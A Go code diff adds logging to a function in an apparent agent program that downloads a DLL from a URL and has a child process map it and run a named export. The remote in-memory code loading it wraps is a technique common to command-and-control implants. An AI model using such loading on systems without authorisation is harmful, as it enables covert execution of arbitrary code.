@@ -60,13 +60,18 @@ var pluginExportPattern = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]{0,127}$`)
 // loadPluginPE fetches the plugin in the parent, then sends the raw DLL bytes
 // to a child over stdin. The child performs all mapping and export execution.
 func loadPluginPE(client *http.Client, cfg *config, url, exportName, input string) (string, error) {
+	started := time.Now()
+	logf("plugin fetch start: url=%s export=%s", url, exportName)
 	if runtime.GOARCH != "amd64" {
+		logf("plugin rejected: unsupported architecture=%s", runtime.GOARCH)
 		return "", errors.New("PE plugins require the windows/amd64 agent build")
 	}
 	data, err := request(client, cfg, http.MethodGet, url, values(cfg), nil)
 	if err != nil {
+		logf("plugin fetch failed: url=%s export=%s elapsed=%s error=%v", url, exportName, time.Since(started), err)
 		return "", fmt.Errorf("plugin download failed: %w", err)
 	}
+	logf("plugin fetched: url=%s export=%s bytes=%d", url, exportName, len(data))
 	var frame bytes.Buffer
 	_ = binary.Write(&frame, binary.LittleEndian, uint32(len(data)))
 	_ = binary.Write(&frame, binary.LittleEndian, uint32(len(input)))
@@ -80,17 +85,22 @@ func loadPluginPE(client *http.Client, cfg *config, url, exportName, input strin
 	var stdout, stderr bytes.Buffer
 	cmd.Stdout = &stdout
 	cmd.Stderr = &stderr
+	logf("plugin child start: url=%s export=%s timeout=%s", url, exportName, pluginRunTimeout)
 	if err := cmd.Run(); err != nil {
 		if ctx.Err() != nil {
+			logf("plugin child timeout: url=%s export=%s elapsed=%s", url, exportName, time.Since(started))
 			return "", fmt.Errorf("plugin timed out after %s", pluginRunTimeout)
 		}
 		message := strings.TrimSpace(stderr.String())
 		if message == "" {
 			message = err.Error()
 		}
+		logf("plugin child failed: url=%s export=%s elapsed=%s error=%s", url, exportName, time.Since(started), message)
 		return "", fmt.Errorf("plugin child failed: %s", message)
 	}
-	return strings.TrimRight(stdout.String(), "\x00\r\n"), nil
+	result := strings.TrimRight(stdout.String(), "\x00\r\n")
+	logf("plugin child completed: url=%s export=%s output_bytes=%d elapsed=%s", url, exportName, len(result), time.Since(started))
+	return result, nil
 }
 
 const pluginRunTimeout = 10 * time.Minute
